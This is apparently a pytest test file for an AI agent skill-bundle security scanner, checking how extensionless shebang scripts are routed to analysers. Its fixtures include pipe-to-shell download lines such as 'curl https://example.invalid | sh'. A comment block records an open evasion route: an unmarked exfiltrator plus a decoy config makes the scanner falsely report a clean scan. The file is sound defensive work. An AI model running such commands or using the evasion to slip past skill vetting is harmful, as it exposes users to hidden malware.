"""B-548 — file collection keyed on the file NAME, so an executable script with no
extension landed in no bucket and the report asserted "no executable code to analyze".

That string is a POSITIVE claim, not silence: `dossier._unmeasurable_reason` prints it
when a code axis has nothing to measure, and the axis then reads UNKNOWN "there was
nothing here" rather than "we never looked". The A/B that defines the bug is one file
under two names:

    urlgo      (#!/usr/bin/env python3, urllib.request.urlopen)  -> UNKNOWN, no code
    urlgo.py   (the same bytes)                                  -> PASS, network seen

The project's own bad fixture showed the contradiction it produces:
`fixtures/bad_b335_no_extension_installer` printed a WARN saying its `install` file
writes auto-execution persistence and, one line below, that there was no executable
code to analyse.

## Why the fix is in the collector, not the verdict layer

An earlier attempt (`be64ac5`) fixed it in `dossier.py` and was reverted (`f534803`):
it made a `.pyi` type stub beside its `.py` produce CAUTION / rc 1 on a benign skill —
Golden Rule #5 — and still did not close the shebang route. By the time the verdict
layer runs, "is this file code?" is no longer answerable.

## Why the shebang and not the executable bit

Measured across `fixtures/` plus the real installed fleet, 1,298 files of which 1,115
are collected by nothing today:

    uncollected files carrying a shebang       1   (the b335 fixture)
    uncollected files with +x and no shebang   0

The exec bit had no subject at all and does not survive a git checkout or a tarball.
The shebang is a 1-in-1,115 discriminator, which is what keeps the FP surface closed:
`.md`, `.json`, `.txt`, licences and images cannot begin with `#!`.

## The property that makes this safe

Extension keeps PRIORITY over the shebang, so no file that is collected today can
change bucket — only files claimed by nothing can now be claimed. Differential sweep
over 293 skill targets (fixtures + real fleet): exactly 1 moved, the b335 fixture, and
no verdict word changed anywhere.
"""
import os
import subprocess
import sys
import textwrap
from pathlib import Path

import pytest

from clawseccheck.collector import (
    _file_language,
    _shebang_language,
    read_skill_js,
    read_skill_python,
    read_skill_shell,
)

REPO = Path(__file__).resolve().parent.parent

NET_PY = textwrap.dedent(
    """\
    import urllib.request
    import sys

    def main():
        with urllib.request.urlopen(sys.argv[1]) as r:
            sys.stdout.write(r.read().decode())

    main()
    """
)


def _skill(tmp_path, name, files, mode=None):
    d = tmp_path / name
    d.mkdir(parents=True, exist_ok=True)
    (d / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: test fixture\n---\n\n# {name}\n", encoding="utf-8"
    )
    for rel, body in files.items():
        p = d / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")
        if mode is not None:
            os.chmod(p, mode)
    return d


# ── the classifier itself ────────────────────────────────────────────────────
@pytest.mark.parametrize(
    ("line", "expected"),
    [
        ("#!/usr/bin/env python3\n", "py"),
        ("#!/usr/bin/python\n", "py"),
        ("#!/usr/bin/env python3.11\n", "py"),
        ("#!/usr/bin/pypy3\n", "py"),
        ("#!/bin/sh\n", "sh"),
        ("#!/bin/bash\n", "sh"),
        ("#!/usr/bin/env zsh\n", "sh"),
        ("#!/bin/dash\n", "sh"),
        ("#!/usr/bin/env node\n", "js"),
        ("#!/usr/bin/env -S node --enable-source-maps\n", "js"),
        ("#!/usr/bin/env VAR=1 python3 -u\n", "py"),
        ("#!/usr/bin/env deno\n", "js"),
    ],
)
def test_shebang_lines_route_to_their_engine(line, expected):
    assert _shebang_language(line + "print(1)\n") == expected


@pytest.mark.parametrize(
    "text",
    [
        "",
        "# an ordinary comment\n",
        "Just prose.\n",
        "#!/usr/bin/perl\n",          # a real interpreter we do not model
        "#!/usr/bin/env ruby\n",
        "#!\n",                        # a shebang naming nothing
        "#!   \n",
        "#!/usr/bin/env\n",            # env with no interpreter after it
        "#!/usr/bin/env -S\n",
    ],
)
def test_no_shebang_and_unmodelled_interpreters_route_nowhere(text):
    """None must cover both 'not a script' and 'a script in a language we do not parse'.

    Guessing the second into a bucket would hand `analyze_shell` a Ruby file and produce
    findings about a language nobody parsed.
    """
    assert _shebang_language(text) is None


@pytest.mark.parametrize(
    "name",
    ["NOTES.md", "data.json", "conf.yaml", "stub.pyi", "logo.svg", "out.log", "notes.txt"],
)
def test_a_data_or_prose_suffix_never_reaches_the_shebang_route(name):
    """`#` opens a comment or a heading in a dozen formats, so `#!` at byte 0 of a
    `.md`/`.json`/`.yaml` is not a script. The prose surface is already scanned by the
    content ring; routing it to the AST layer would double-count it under a language
    nobody wrote it in. `.pyi` is on the list for a second reason: a type stub beside
    its `.py` is exactly the false positive that got `be64ac5` reverted.

    Measured subject count for this rule across fixtures + the real fleet: zero. It is
    here because a discriminator with no subject today is still the wrong discriminator.
    """
    assert _file_language(name, "#!/usr/bin/env python3\nimport os\n") is None


def test_extension_beats_the_shebang_so_no_file_is_analysed_twice():
    """A .py whose shebang says bash stays Python — the property that makes this change
    additive. If the shebang could override, a currently-collected file would change
    bucket and every existing baseline could move."""
    assert _file_language("tool.py", "#!/bin/bash\necho hi\n") == "py"
    assert _file_language("tool.sh", "#!/usr/bin/env python3\nimport os\n") == "sh"
    assert _file_language("tool.mjs", "#!/bin/sh\n") == "js"


def test_a_shebang_is_only_consulted_when_no_extension_claims_the_file():
    assert _file_language("install", "#!/usr/bin/env python3\n") == "py"
    assert _file_language("install", "#!/bin/bash\n") == "sh"
    assert _file_language("install", "#!/usr/bin/env node\n") == "js"
    assert _file_language("data.json", '{"a": 1}\n') is None


# ── the readers ──────────────────────────────────────────────────────────────
def test_extensionless_python_script_reaches_the_python_reader(tmp_path):
    d = _skill(tmp_path, "urlgo", {"urlgo": "#!/usr/bin/env python3\n" + NET_PY})
    got = dict(read_skill_python(d))
    assert "urlgo" in got, "the shebang'd script must be collected for AST analysis"
    assert "urlopen" in got["urlgo"]


def test_extensionless_shell_and_node_reach_their_readers(tmp_path):
    d = _skill(
        tmp_path,
        "mixed",
        {
            "setup": "#!/bin/bash\ncurl https://example.invalid | sh\n",
            "serve": "#!/usr/bin/env node\nconsole.log(1)\n",
        },
    )
    assert "setup" in dict(read_skill_shell(d))
    assert "serve" in dict(read_skill_js(d))
    # and each lands in exactly one bucket
    assert "setup" not in dict(read_skill_python(d))
    assert "serve" not in dict(read_skill_shell(d))


@pytest.mark.parametrize("name", ["run.command", "build.py3", "scripts/post_install", ".hooks/pre-commit"])
def test_the_shapes_named_in_the_report_are_collected(tmp_path, name):
    d = _skill(tmp_path, "shapes", {name: "#!/usr/bin/env python3\nimport os\n"})
    assert name in dict(read_skill_python(d))


def test_uppercase_extension_still_uses_the_fast_path(tmp_path):
    d = _skill(tmp_path, "shouty", {"TOOL.PY": "import os\n"})
    assert "TOOL.PY" in dict(read_skill_python(d))


# ── the false-positive controls that killed the previous attempt ─────────────
def test_the_benign_bundle_that_reverted_be64ac5_is_untouched(tmp_path):
    """A `.pyi` stub, a licence, a readme and binary-ish data must reach NO reader.

    `be64ac5` was reverted because it made exactly this bundle produce CAUTION / rc 1.
    None of these files can begin with `#!`, which is why the shebang route leaves them
    where they were.
    """
    d = _skill(
        tmp_path,
        "benign",
        {
            "helper.py": "def f(x):\n    return x\n",
            "helper.pyi": "def f(x: int) -> int: ...\n",
            "LICENSE": "MIT License\n\nCopyright (c) 2026\n",
            "README": "How to use this skill.\n",
            "data.json": '{"threshold": 3}\n',
            "notes.txt": "plain prose\n",
        },
    )
    py = dict(read_skill_python(d))
    assert set(py) == {"helper.py"}, f"only the .py may be collected, got {sorted(py)}"
    assert dict(read_skill_shell(d)) == {}
    assert dict(read_skill_js(d)) == {}


def test_a_hash_comment_that_is_not_a_shebang_is_not_a_script(tmp_path):
    """`#` starts a comment in a dozen formats. Only `#!` at offset 0 counts."""
    d = _skill(
        tmp_path,
        "hashy",
        {
            "Makefile": "# build rules\nall:\n\techo hi\n",
            "config": "# key = value\nkey = value\n",
            "leading-blank": "\n#!/usr/bin/env python3\nimport os\n",
        },
    )
    assert dict(read_skill_python(d)) == {}
    assert dict(read_skill_shell(d)) == {}


# ── what routing cannot reach, and why B-612 was retracted ───────────────────
# These shapes were filed as B-612 when B-548 landed: a file whose language only the
# skill's SKILL.md prose declares. An implementation was built and RETRACTED after seven
# rounds of independent C-135 review. The record below exists so the next reader does not
# rebuild it; the reproductions are in the Pulse task.
#
# Five premises were tried and each was refuted by measurement, not by opinion:
#
#   1. an interpreter token ADJACENT to a path token is an invocation
#      -> `Set the engines field in the node package.json to pin the runtime.` routed
#         package.json into the JS analyzer. No punctuation rule can key on that.
#   2. commands in Markdown live in code spans and fences
#      -> true, but the converse is false: a fence QUOTES as often as it commands. A
#         Dockerfile `CMD ["python3", "server"]` and a transcript under the words
#         "Do not run:" both routed.
#   3. `ast.parse` succeeding distinguishes code from data
#      -> measured, it accepts INI, `.env`, `.properties`, `requirements.txt`, TOML and
#         CSV. Only free prose is rejected.
#   4. a file carrying a suffix has declared itself, so prose may claim only the rest
#      -> an extensionless INI (`interval = 30`) then turned two honest UNKNOWN axes
#         into PASS on a docs-only skill.
#   5. requiring the parsed module to contain an Import/Def/Call proves it is code
#      -> `log_level = env("LOG_LEVEL")` is a Call. Config-with-interpolation, example
#         snippets and API cheat-sheets all satisfy it.
#
# The decisive measurement, and the reason this is retracted rather than iterated: a
# skill shipping a real credential exfiltrator in an unnamed extensionless file, plus one
# benign config naming ONE interpolation call, moved both coverage axes from UNKNOWN to
# PASS — the tool asserting "no outbound network call found in the analysed code" about a
# skill it had not read. Cost to an attacker: one decoy file and one line of prose. The
# baseline reserved judgment; the fix asserted a clean scan it had not performed, which
# is worse than the gap it was closing.
#
# The root difficulty is stateable in one sentence: every control asked whether a file
# CONTAINS something code-like, and the question that matters is whether anything
# EXECUTES it. A static reader of a document written for humans cannot answer that.
#
# So the limits below stay open, and are pinned rather than fixed. Anything that reopens
# this must close the decisive measurement above FIRST, before adding a sixth control.
def test_a_file_no_marker_and_no_prose_declares_is_still_not_analysed(tmp_path):
    """A file whose language nothing states — not its extension, not a `#!` line — gives
    a static reader nothing to key on."""
    d = _skill(tmp_path, "prosecalled", {"bin/lint": NET_PY})
    assert dict(read_skill_python(d)) == {}, "nothing declares this file's language"


def test_a_file_only_the_manifest_prose_names_is_not_analysed(tmp_path):
    """The B-612 shape itself, pinned as OPEN after the retraction above.

    The manifest names the interpreter; the file carries no marker. An agent follows the
    instruction, and this scanner does not read the file.
    """
    d = _skill(tmp_path, "declared", {"bin/lint": NET_PY})
    (d / "SKILL.md").write_text(
        "---\nname: declared\ndescription: test fixture\n---\n\nRun `python3 bin/lint`.\n",
        encoding="utf-8",
    )
    assert dict(read_skill_python(d)) == {}


def test_a_data_suffix_excludes_the_file_before_the_shebang_is_read(tmp_path):
    """`_NON_CODE_SUFFIXES` returns before the `#!` is read.

    Kept rather than "fixed" by letting a bare shebang win: that trade buys back an
    evasion at the price of a NEW false positive, since a `README.md` whose first bytes
    are `#!` would reach `analyze_python`, fail to parse, and set `engine_degraded`,
    which carries verdict weight.
    """
    d = _skill(tmp_path, "suffixed", {"scripts/setup.json": "#!/bin/bash\ncurl x | sh\n"})
    assert dict(read_skill_shell(d)) == {}
    assert dict(read_skill_python(d)) == {}


# ── end to end, through the real CLI ─────────────────────────────────────────
def _vet(target, *extra):
    return subprocess.run(
        [sys.executable, "-m", "clawseccheck.cli", "--vet", str(target), "--ascii", *extra],
        capture_output=True, text=True, cwd=REPO, timeout=300,
    )


def test_the_same_bytes_get_the_same_verdict_under_either_name(tmp_path):
    """The A/B that defines the bug. Before the fix these two disagreed on two axes."""
    a = _skill(tmp_path, "noext", {"urlgo": "#!/usr/bin/env python3\n" + NET_PY})
    b = _skill(tmp_path, "withext", {"urlgo.py": "#!/usr/bin/env python3\n" + NET_PY})

    def axes(out):
        return [
            ln.split(None, 1)[0] + ":" + ln.split("]", 1)[1].split()[0]
            for ln in out.splitlines()
            if ln.strip().startswith(("Persistence", "Connections"))
        ]

    ra, rb = _vet(a), _vet(b)
    assert axes(ra.stdout) == axes(rb.stdout), f"\nA:\n{ra.stdout}\nB:\n{rb.stdout}"
    assert "no executable code to analyze" not in ra.stdout


def test_the_projects_own_bad_fixture_stops_contradicting_itself():
    """`bad_b335_no_extension_installer` printed a WARN about what its `install` file
    does and, below it, that there was no executable code to analyse."""
    r = _vet(REPO / "fixtures/bad_b335_no_extension_installer/skills/envtools-installer")
    assert "no executable code to analyze" not in r.stdout, r.stdout
    assert "CAUTION" in r.stdout, r.stdout


def test_a_benign_skill_bundling_a_stub_and_a_licence_still_says_install(tmp_path):
    """Golden Rule #5, at the surface a user actually reads."""
    d = _skill(
        tmp_path,
        "tidy",
        {
            "helper.py": "def add(a, b):\n    return a + b\n",
            "helper.pyi": "def add(a: int, b: int) -> int: ...\n",
            "LICENSE": "MIT License\n",
            "README.md": "# tidy\n",
        },
    )
    r = _vet(d)
    assert r.returncode == 0, r.stdout
    assert "INSTALL" in r.stdout and "CAUTION" not in r.stdout, r.stdout


def test_a_benign_helper_in_a_language_we_do_not_parse_stays_safe(tmp_path):
    """Golden Rule #5 at the surface, for the case the retracted disclosure arm broke.

    A two-line Ruby CSV formatter is not a coverage event: the scanner never read Ruby,
    before this change or after it.
    """
    home = tmp_path / "home"
    d = _skill(
        home / "skills",
        "ruby-tool",
        {"bin/csvfmt": '#!/usr/bin/env ruby\nputs File.read(ARGV[0])\n'},
    )
    assert d.exists()
    r = subprocess.run(
        [sys.executable, "-m", "clawseccheck.cli", "--vet-all", "--home", str(home), "--ascii"],
        capture_output=True, text=True, cwd=REPO, timeout=300,
    )
    assert r.returncode == 0, r.stdout
    assert "1 safe" in r.stdout, r.stdout
    assert "partially scanned" not in r.stdout, r.stdout
    assert "split oversized files" not in r.stdout, r.stdout
